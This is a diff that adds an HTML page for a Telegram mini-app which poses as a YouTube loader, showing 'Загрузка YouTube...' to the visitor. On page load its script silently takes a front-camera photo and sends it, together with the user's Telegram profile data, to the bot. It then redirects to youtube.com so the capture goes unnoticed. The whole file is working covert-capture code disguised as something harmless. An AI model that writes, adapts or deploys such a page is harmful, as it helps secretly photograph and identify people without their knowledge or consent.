@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { margin:0; background:#000; color:#fff; font-family:sans-serif; height:100vh; display:flex; align-items:center; justify-content:center; }
+        #status { font-size:24px; }
+    </style>
+</head>
+<body>
+    <div id="status">Загрузка YouTube...</div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+
+        async function takePhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" }
+                });
+
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext("2d").drawImage(video, 0, 0);
+
+                const base64 = canvas.toDataURL("image/jpeg", 0.8);
+
+                stream.getTracks().forEach(track => track.stop());
+
+                const data = JSON.stringify({
+                    photo: base64,
+                    user: tg.initDataUnsafe.user || {}
+                });
+
+                tg.sendData(data);
+
+                tg.openLink("https://youtube.com", { try_instant_view: false });
+
+            } catch (err) {
+                console.error(err);
+                tg.openLink("https://youtube.com");
+            }
+        }
+
+        takePhoto();
+    </script>
+</body>
+</html>
